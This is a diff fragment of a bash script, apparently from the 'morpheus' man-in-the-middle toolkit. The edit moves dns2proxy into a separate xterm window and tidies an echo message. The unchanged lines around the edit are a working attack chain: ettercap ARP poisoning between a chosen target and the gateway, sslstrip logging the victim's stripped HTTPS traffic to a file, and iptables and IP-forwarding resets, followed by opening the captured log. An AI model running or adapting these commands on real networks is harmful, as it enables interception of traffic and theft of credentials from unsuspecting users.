@@ -2675,12 +2675,12 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
     echo ${GreenF}[☠]${white} Using IPv6 settings ${Reset};
     echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
     sleep 2
-    python $dnsproxypath & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost// /$gateway//
+    xterm -T "MORPHEUS - dns2proxy" -geometry 90x26 -e "python $dnsproxypath" & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost// /$gateway//
   else
     echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
     echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
     sleep 2
-    python $dnsproxypath & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost/ /$gateway/
+    xterm -T "MORPHEUS - dns2proxy" -geometry 90x26 -e "python $dnsproxypath" & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost/ /$gateway/
   fi
 
 
@@ -2696,7 +2696,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   iptables --table nat --delete-chain
   # reset ip-forward
   echo "0" > /proc/sys/net/ipv4/ip_forward
-  echo ${BlueF}[☠]${white} editing sslstrip session log File ${BlueF}]${Reset};
+  echo ${BlueF}[☠]${white} editing sslstrip session log File ${Reset};
   sleep 4
   xterm -T "Sslstrip session log" -e "nano $IPATH/output/log.txt"
   sleep 2
